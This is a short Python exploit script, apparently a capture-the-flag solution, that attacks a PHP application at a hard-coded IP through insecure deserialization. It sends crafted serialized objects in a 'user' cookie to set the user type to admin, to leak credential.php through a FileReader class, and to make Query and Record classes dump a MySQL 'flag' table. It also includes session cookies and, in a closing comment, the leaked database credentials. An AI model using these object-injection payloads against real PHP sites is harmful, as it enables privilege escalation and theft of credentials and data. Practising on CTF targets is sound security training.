from urllib.parse import quote

import requests

BASE_URL = "http://103.152.242.197:1001/"

payload='O%3A4%3A%22User%22%3A1%3A%7Bs%3A10%3A%22%00User%00type%22%3Bs%3A5%3A%22admin%22%3B%7D' # Bypass admin

payload = b'O:10:"FileReader":2:{s:16:"\x00FileReader\x00file";s:14:"credential.php";s:21:"\x00FileReader\x00whiteList";a:8:{i:0;s:14:"credential.php";i:1;s:14:"filereader.php";i:2;s:8:"flag.php";i:3;s:9:"index.php";i:4;s:9:"login.php";i:5;s:9:"query.php";i:6;s:10:"record.php";i:7;s:8:"user.php";}}' # leak credential.php

store = b'O:6:"Record":6:{s:12:"\x00Record\x00host";s:5:"mysql";s:12:"\x00Record\x00user";s:6:"val0id";s:12:"\x00Record\x00pass";s:6:"kaboom";s:10:"\x00Record\x00db";s:13:"serial_killer";s:10:"\x00Record\x00tb";s:4:"flag";s:12:"\x00Record\x00conn";N;}' # Class records


query = 'O:5:"Query":1:{s:12:"\x00Query\x00store";O:6:"Record":6:{s:12:"\x00Record\x00host";s:5:"mysql";s:12:"\x00Record\x00user";s:6:"val0id";s:12:"\x00Record\x00pass";s:6:"kaboom";s:10:"\x00Record\x00db";s:13:"serial_killer";s:10:"\x00Record\x00tb";s:4:"flag";s:12:"\x00Record\x00conn";N;}}' #class Query




cookie = {
  "PHPSESSID": "9fdaf1f8ca7f5d94625f7b661038a9b5",
  "session": "1250efec-8d13-469b-a183-85b2b5497d58.Kui4Hfv_JOknekwXc2ysSBLySxc",
  "user": quote(query),
}

r = requests.get(BASE_URL + "/flag.php", cookies=cookie)
print(r.text)

'''
$mysql_host = "mysql";
$mysql_user = "val0id";
$mysql_pass = "kaboom";
$mysql_db = "serial_killer";
'''